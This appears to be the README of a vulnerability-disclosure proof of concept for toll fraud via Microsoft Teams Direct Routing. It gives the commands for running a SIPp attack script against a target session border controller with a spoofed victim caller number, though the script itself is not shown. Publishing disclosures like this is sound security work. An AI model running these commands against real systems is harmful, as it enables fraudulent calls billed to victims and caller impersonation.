# MSTDR-PoC

Microsoft Teams Direct Routing toll fraud proof of concept script for SIPp.

Please consider the [detailed blog post](https://blog.syss.com/posts/abusing-ms-teams-direct-routing/) for more information about the security issues.

## Usage

1. Generate a self-signed certificate:


```
openssl req -x509 -nodes -days 365 -newkey rsa:2048 -keyout selfsign.key -out selfsign.crt
```

2. Execute the poc.xml script with [SIPp](http://sipp.sourceforge.net/):

```
sipp <target-sbc-ip>:<target-port> -sf poc.xml -s <dest-phone-number> \
-m 1 -t l1 -tls_cert selfsign.crt -tls_key selfsign.key \
-key hostname <target-sbc-hostname> -key caller <victim-phone-number>
```

## Disclaimer

Use at your own risk. Do not use without full consent of everyone involved. For educational purposes only. 
